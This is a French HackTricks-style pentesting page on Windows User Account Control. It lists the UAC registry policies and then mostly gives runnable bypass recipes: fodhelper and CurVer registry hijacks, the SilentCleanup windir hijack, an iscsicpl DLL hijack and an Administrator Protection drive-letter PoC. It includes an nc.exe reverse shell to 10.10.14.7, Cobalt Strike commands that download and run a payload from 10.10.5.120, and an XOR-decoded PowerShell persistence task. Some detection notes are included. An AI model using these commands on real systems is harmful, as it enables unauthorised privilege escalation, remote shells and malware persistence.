# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une **demande de consentement pour les activités nécessitant une élévation de privilèges**. Les applications possèdent différents niveaux d'`integrity`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Lorsque l'UAC est activé, les applications et les tâches **s'exécutent toujours dans le contexte de sécurité d'un compte non-administrateur**, sauf si un administrateur autorise explicitement ces applications/tâches à disposer d'un accès de niveau administrateur au système pour s'exécuter. Il s'agit d'une fonctionnalité pratique qui protège les administrateurs contre les modifications involontaires, mais elle n'est pas considérée comme une frontière de sécurité.

Pour plus d'informations sur les niveaux d'intégrité :


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Lorsque l'UAC est en place, un utilisateur administrateur reçoit 2 tokens : un token utilisateur standard, pour effectuer les actions habituelles avec un niveau d'intégrité moyen, et un autre avec les privilèges administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail le fonctionnement de l'UAC et inclut le processus d'ouverture de session, l'expérience utilisateur et l'architecture de l'UAC. Les administrateurs peuvent utiliser les stratégies de sécurité pour configurer le fonctionnement de l'UAC en fonction de leur organisation au niveau local (avec secpol.msc), ou le configurer et le déployer via des objets de stratégie de groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont détaillés [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de stratégie de groupe qui peuvent être définis pour l'UAC. Le tableau suivant fournit des détails supplémentaires :

| Paramètre de stratégie de groupe                                                                                                                                                                                                                                                                                                                                                           | Clé de registre                | Paramètre par défaut                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Désactivé)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Demander le consentement pour les binaires non-Windows sur le bureau sécurisé) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Demander les identifiants sur le bureau sécurisé)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Activé ; désactivé par défaut sur Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Désactivé)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Activé)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Activé)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Désactivé)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Activé)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Activé)                                              |

### Stratégies pour installer des logiciels sous Windows

Les **stratégies de sécurité locales** ("secpol.msc" sur la plupart des systèmes) sont configurées par défaut pour **empêcher les utilisateurs non-administrateurs d'installer des logiciels**. Cela signifie que même si un utilisateur non-administrateur peut télécharger l'installateur de votre logiciel, il ne pourra pas l'exécuter sans un compte administrateur.

### Clés de registre pour forcer l'UAC à demander une élévation de privilèges

En tant qu'utilisateur standard sans droits administrateur, vous pouvez vous assurer que le compte "standard" **doit fournir ses identifiants via l'UAC** lorsqu'il tente d'effectuer certaines actions. Cette action nécessiterait de modifier certaines **clés de registre**, pour lesquelles des permissions administrateur sont nécessaires, sauf s'il existe un **UAC bypass**, ou si l'attaquant est déjà connecté en tant qu'administrateur.

Même si l'utilisateur appartient au groupe **Administrators**, ces modifications obligent l'utilisateur à **saisir à nouveau les identifiants de son compte** afin d'effectuer des actions administratives.

**En pratique, cela n'est utile qu'une fois que vous disposez déjà d'un token élevé, d'un UAC bypass ou d'une mauvaise configuration vous permettant de modifier ces clés ; dans le cas contraire, l'écriture dans le registre elle-même est bloquée.**

Les clés et entrées de registre à modifier sont les suivantes (avec leurs valeurs par défaut entre parenthèses) :

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Cela peut également être effectué manuellement via l'outil Stratégie de sécurité locale. Une fois ces paramètres modifiés, les opérations administratives demandent à l'utilisateur de saisir à nouveau ses identifiants.

### Remarque

**L'User Account Control n'est pas une frontière de sécurité.** Par conséquent, les utilisateurs standards ne peuvent pas sortir de leur compte et obtenir des droits administrateur sans un exploit de privilege escalation local.

### Demander un « accès complet à l'ordinateur » à un utilisateur
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilèges UAC

- Internet Explorer Protected Mode utilise des contrôles d'intégrité pour empêcher les processus ayant un niveau d'intégrité élevé (comme les navigateurs web) d'accéder aux données ayant un niveau d'intégrité faible (comme le dossier des fichiers Internet temporaires). Cela est réalisé en exécutant le navigateur avec un token ayant un faible niveau d'intégrité. Lorsque le navigateur tente d'accéder à des données stockées dans la zone de faible intégrité, le système d'exploitation vérifie le niveau d'intégrité du processus et autorise l'accès en conséquence. Cette fonctionnalité contribue à empêcher les attaques d'exécution de code à distance d'accéder aux données sensibles du système.
- Lorsqu'un utilisateur ouvre une session Windows, le système crée un token d'accès contenant une liste des privilèges de l'utilisateur. Les privilèges sont définis comme la combinaison des droits et des capacités d'un utilisateur. Le token contient également une liste des credentials de l'utilisateur, qui sont utilisés pour authentifier l'utilisateur auprès de l'ordinateur et des ressources du réseau.

### Autoadminlogon

Pour configurer Windows afin qu'il ouvre automatiquement une session avec un utilisateur spécifique au démarrage, définissez la **`AutoAdminLogon` registry key**. Cette fonctionnalité est utile dans les environnements de kiosque ou à des fins de test. Utilisez-la uniquement sur des systèmes sécurisés, car elle expose le mot de passe dans le registre.

Définissez les clés suivantes à l'aide de l'Éditeur du Registre ou de `reg add` :

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` :
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Pour rétablir le comportement normal d'ouverture de session, définissez `AutoAdminLogon` sur 0.

## UAC bypass

> [!TIP]
> Notez que si vous disposez d'un accès graphique à la victime, le UAC bypass est simple, car il vous suffit de cliquer sur « Yes » lorsque l'invite UAC apparaît.

Le UAC bypass est nécessaire dans la situation suivante : **l'UAC est activé, votre processus s'exécute dans un contexte d'intégrité moyenne et votre utilisateur appartient au groupe des administrateurs**.

Il est important de mentionner qu'il est **beaucoup plus difficile de bypass l'UAC lorsqu'il est configuré sur le niveau de sécurité le plus élevé (Always) que lorsqu'il est configuré sur l'un des autres niveaux (Default).**

### Triage rapide depuis un shell à intégrité moyenne

Avant d'essayer un bypass, confirmez que vous êtes dans le bon scénario et associez le build de l'hôte aux méthodes connues comme fonctionnelles :
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notes pratiques :
- Si `EnableLUA=0`, vous n'avez pas besoin de bypass : tout admin token peut directement demander une high integrity.
- `ConsentPromptBehaviorAdmin=2` ou `5` est le scénario courant pour les bypass auto-elevate / basés sur COM.
- `Always Notify` augmente le niveau de difficulté, mais vous devez tout de même tester le build exact au lieu de supposer un échec : UACME suit encore certaines méthodes `AlwaysNotify compatible` sur les builds modernes de Windows.

### UAC désactivé

Si UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un reverse shell avec des privilèges admin** (high integrity level) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Très** Basic UAC "bypass" (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur membre du groupe Administrators, vous pouvez **monter le partage C$** via SMB (système de fichiers) localement sur un nouveau disque et vous aurez **accès à tout le contenu du système de fichiers** (même au dossier personnel de l’Administrator).

> [!WARNING]
> **Il semblerait que cette astuce ne fonctionne plus**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Contournement de UAC avec cobalt strike

Les techniques de Cobalt Strike fonctionneront uniquement si UAC n’est pas configuré à son niveau de sécurité maximal
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** disposent également de plusieurs modules pour **bypass** le **UAC**.

### Interfaces COM élevées (`ICMLuaUtil` / `CMSTPLUA`)

Les objets COM auto-élevés restent une surface UAC pratique sur les builds modernes. `ICMLuaUtil` est toujours répertorié par UACME comme fonctionnel sur les branches actuelles de Windows, et les outils offensifs continuent d'adapter `CMSTPLUA` en combinant un processus du bureau interactif, une exécution 64 bits et parfois le masquerading du PEB/processus avant d'invoquer le COM Elevation Moniker.

Conseils pratiques :
- Préférez un processus **64 bits** dans la **session interactive** de l'utilisateur (généralement `explorer.exe` ou un processus enfant).
- Si un shell brut échoue, réessayez depuis un BOF / une implémentation UACME plutôt qu'avec un simple wrapper `CreateProcess`.
- Attendez-vous à ce que l'exécution enfant se produise dans un **processus élevé distinct** ; de nombreux BOF n'élèvent pas le beacon actuel sur place.

### KRBUACBypass

Documentation et outil disponibles sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass UAC

[**UACME** ](https://github.com/hfiref0x/UACME), qui est une **compilation** de plusieurs exploits de bypass UAC. Notez que vous devrez **compiler UACME avec Visual Studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`) ; vous devrez savoir **lequel utiliser.**\
Vous devez être **prudent**, car certains bypass **afficheront des invites pour d'autres programmes**, ce qui **alertera** l'**utilisateur** qu'une action est en cours.

UACME indique la **version de build à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions :
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
De plus, en utilisant [cette](https://en.wikipedia.org/wiki/Windows_10_version_history) page, vous obtenez la release Windows `1607` à partir des versions de build.

Un workflow pratique consiste d’abord à **évaluer le build de l’hôte**, puis à exécuter la méthode correspondante :
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compare rapidement le build local avec ses méthodes UAC connues, ce qui est utile pour écarter rapidement les PoC obsolètes.
- `UACME` reste le meilleur catalogue public pour associer un bypass à un build précis. Les versions récentes ont ajouté de nouvelles méthodes et retesté les méthodes existantes avec **Windows 11 25H2**. Vérifiez donc à nouveau le README et les release notes avant de supposer qu’un ancien article de blog s’applique toujours sans modification.

### UAC Bypass – fodhelper.exe (Registry hijack)

Le binaire de confiance `fodhelper.exe` est auto-élevé sur les versions modernes de Windows. Lorsqu’il est lancé, il interroge le chemin de registre par utilisateur ci-dessous sans valider le verbe `DelegateExecute`. Y placer une commande permet à un processus de niveau d’intégrité Medium (l’utilisateur appartient au groupe Administrators) de lancer un processus de niveau d’intégrité High sans invite UAC.

Chemin de registre interrogé par fodhelper :
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Étapes PowerShell (définissez votre payload, puis déclenchez-le)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes :
- Fonctionne lorsque l’utilisateur actuel est membre du groupe Administrators et que le niveau d’UAC est défini sur la valeur par défaut/lenient (et non sur Always Notify avec des restrictions supplémentaires).
- Utilisez le chemin `sysnative` pour démarrer un PowerShell 64 bits depuis un processus 32 bits sur Windows 64 bits.
- Le Payload peut être n’importe quelle commande (PowerShell, cmd ou chemin vers un EXE). Évitez les interfaces demandant une interaction pour rester furtif.

#### CurVer/extension hijack variant (HKCU uniquement)

Des échantillons récents exploitant `fodhelper.exe` évitent `DelegateExecute` et redirigent à la place le ProgID `ms-settings` via la valeur `CurVer` propre à l’utilisateur. Le binaire auto-elevated résout toujours le handler sous `HKCU`, donc aucun token administrateur n’est nécessaire pour créer les clés :
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Une fois les privilèges élevés, le malware **désactive généralement les futures invites** en définissant `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` sur `0`, puis effectue une defense evasion supplémentaire (par exemple, `Add-MpPreference -ExclusionPath C:\ProgramData`) et recrée la persistence pour s’exécuter avec une high integrity. Une tâche de persistence typique stocke sur le disque un script PowerShell **chiffré avec XOR**, puis le décode et l’exécute en mémoire toutes les heures :
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Cette variante nettoie toujours le **dropper** et ne laisse que les **staged payloads**, ce qui fait que la détection repose sur la surveillance du **`CurVer` hijack**, de la modification de `ConsentPromptBehaviorAdmin`, de la création d’une exclusion Defender ou des scheduled tasks qui déchiffrent en mémoire du PowerShell.

### UAC bypass via la tâche `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` lance `cleanmgr.exe` avec les privilèges les plus élevés et développe `%windir%` depuis l’environnement utilisateur. Si vous contrôlez `HKCU\Environment\windir`, vous pouvez rediriger cette expansion vers une commande arbitraire et obtenir une intégrité élevée sans boîte de dialogue de consentement. Cette méthode mérite toujours d’être testée sur les builds récentes, car UACME maintient la technique active et le suivi récent des problèmes indique que Windows 11 24H2 pourrait ne nécessiter que de petits ajustements de guillemets.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Si la tâche encadre le chemin sur ce build, réessayez avec le payload se terminant par un guillemet (par exemple `cmd.exe"`). Nettoyez toujours `HKCU\Environment\windir` après les tests.

#### Plus de UAC bypass

De nombreux UAC bypass classiques qui exploitent les flux d’interface utilisateur, les objets COM ou l’interaction avec le bureau nécessitent une **session interactive complète** avec la victime ; un shell `nc.exe` classique ou un service exécuté dans la **Session 0** ne suffit souvent pas.

Vous pouvez souvent résoudre ce problème avec une session **meterpreter**. Migrez vers un **process** dont la valeur **Session** est égale à **1** :

![Pointez ms-settings vers une extension personnalisée (.thm) et associez cette extension à notre payload - Plus de UAC bypass : Vous pouvez utiliser une session meterpreter. Migrez vers un process dont la valeur Session...](<../../images/image (863).png>)

(_explorer.exe_ devrait fonctionner)

### UAC Bypass avec une GUI

Si vous avez accès à une **GUI**, vous pouvez simplement accepter l’invite UAC lorsqu’elle apparaît ; vous n’avez pas réellement besoin d’un bypass technique. Par conséquent, obtenir une session GUI suffit souvent à contourner les contraintes pratiques ajoutées par UAC.

De plus, si vous obtenez une session GUI utilisée par quelqu’un (potentiellement via RDP), **certains outils seront exécutés en tant qu’administrateur**, ce qui vous permettrait d’**exécuter** directement un **cmd**, par exemple **en tant qu’administrateur**, sans qu’une nouvelle invite UAC apparaisse, comme avec [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela peut être un peu plus **furtif**.

### UAC bypass par brute force bruyant

Si le bruit ne vous préoccupe pas, vous pouvez toujours **exécuter quelque chose comme** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), qui **demande l’élévation des permissions jusqu’à ce que l’utilisateur l’accepte**.

### Votre propre bypass - Méthodologie de base pour UAC bypass

Si vous examinez **UACME**, vous remarquerez que **de nombreux UAC bypass exploitent le DLL hijacking** (souvent en faisant charger à un binaire élevé une DLL contrôlée par l’attaquant depuis un chemin accessible en écriture). [Lisez ceci pour apprendre à trouver une vulnérabilité de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trouvez un binaire qui s’**autoélève** (vérifiez que, lorsqu’il est exécuté, il s’exécute avec un niveau d’intégrité élevé).
2. Avec ProcMon, trouvez les événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **DLL Hijacking**.
3. Vous devrez probablement **écrire** la DLL dans des **chemins protégés** (comme C:\Windows\System32), dans lesquels vous n’avez pas les permissions d’écriture. Vous pouvez contourner cela avec :
1. **wusa.exe** : Windows 7, 8 et 8.1. Il permet d’extraire le contenu d’un fichier CAB dans des chemins protégés (car cet outil est exécuté avec un niveau d’intégrité élevé).
2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL dans le chemin protégé, puis exécuter le binaire vulnérable et autoélevé.

### Une autre technique de UAC bypass

Elle consiste à vérifier si un **binaire autoElevated** tente de **lire** dans le **registre** le **nom/chemin** d’un **binaire** ou d’une **commande** à **exécuter** (c’est plus intéressant si le binaire recherche ces informations dans **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + DLL hijack du `PATH` utilisateur

Le binaire 32 bits `C:\Windows\SysWOW64\iscsicpl.exe` est un binaire **autoélevé** qui peut être exploité pour charger `iscsiexe.dll` selon l’ordre de recherche. Si vous pouvez placer un `iscsiexe.dll` malveillant dans un dossier **accessible en écriture par l’utilisateur**, puis modifier le `PATH` de l’utilisateur actuel (par exemple via `HKCU\Environment\Path`) afin que ce dossier soit recherché, Windows peut charger la DLL de l’attaquant dans le process élevé `iscsicpl.exe` **sans afficher d’invite UAC**.

Notes pratiques :
- Cette technique est utile lorsque l’utilisateur actuel appartient au groupe **Administrators**, mais s’exécute avec une **Medium Integrity** à cause de UAC.
- La copie **SysWOW64** est celle qui nous intéresse pour ce bypass. Considérez la copie **System32** comme un binaire distinct et validez son comportement séparément.
- La primitive combine l’**auto-élévation** et le **DLL search-order hijacking** ; le même workflow ProcMon que pour les autres UAC bypass est donc utile pour valider le chargement de la DLL manquante.

Flux minimal :
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idées de détection :
- Déclencher une alerte lors de l’utilisation de `reg add` / d’écritures dans le registre vers `HKCU\Environment\Path`, immédiatement suivie de l’exécution de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Rechercher `iscsiexe.dll` dans des emplacements **contrôlés par l’utilisateur** tels que `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Corréler les lancements de `iscsicpl.exe` avec des processus enfants ou des chargements de DLL inattendus provenant de répertoires Windows non standard.

### Nouvelles recherches à examiner séparément

Certaines chaînes post-2024 ne ressemblent plus aux détournements classiques du registre `HKCU\Software\Classes`. Par exemple, l’empoisonnement du cache du contexte d’activation peut combiner un **remappage de lecteur** et une **redirection de DLL** pour passer d’une intégrité moyenne à une intégrité élevée via des binaires d’interface utilisateur approuvés / à élévation automatique tels que `ctfmon.exe`, puis des cibles ultérieures comme `fodhelper.exe`. Au lieu de reproduire ici le PoC volumineux, consultez les exemples de payload compacts dans :

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Détournement de lettre de lecteur d’Administrator Protection (25H2) via la table des périphériques DOS par session de connexion

Pour connaître toute la surface d’attaque `RAiLaunchAdminProcess` / UIAccess sur Windows 11 25H2, consultez la page dédiée :

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 « Administrator Protection » utilise des tokens shadow-admin avec des tables `\Sessions\0\DosDevices/<LUID>` propres à chaque session. Le répertoire est créé de manière différée par `SeGetTokenDeviceMap` lors de la première résolution de `\??`. Si l’attaquant usurpe le token shadow-admin uniquement au niveau **SecurityIdentification**, le répertoire est créé avec l’attaquant comme **propriétaire** (il hérite de `CREATOR OWNER`), ce qui permet de créer des liens de lettres de lecteur prioritaires par rapport à `\GLOBAL??`.

**Étapes :**

1. Depuis une session faiblement privilégiée, appeler `RAiProcessRunOnce` pour lancer un `runonce.exe` shadow-admin sans invite.
2. Dupliquer son token principal en token **d’identification** et l’usurper tout en ouvrant `\??` afin de forcer la création de `\Sessions\0\DosDevices/<LUID>` sous le contrôle de l’attaquant.
3. Créer un lien symbolique `C:` qui pointe vers un emplacement contrôlé par l’attaquant ; les accès ultérieurs au système de fichiers dans cette session résolvent `C:` vers le chemin de l’attaquant, permettant un détournement de DLL/fichier sans invite.

**PowerShell PoC (NtObjectManager) :**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Références
- [LOLBAS : Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – Fonctionnement du User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – Collection de techniques de bypass de l'UAC](https://github.com/hfiref0x/UACME)
- [WinPwnage – Scanner de compatibilité et launcher pour le bypass de l'UAC](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI adopte l'IA pour générer des backdoors PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos : exploitation d'un 0-Day contre des cibles gouvernementales d'Asie du Sud-Est](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Contourner la protection des administrateurs Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – Contourner la protection des administrateurs en exploitant l'accès UI](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – Bypass de l'UAC via la tâche SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
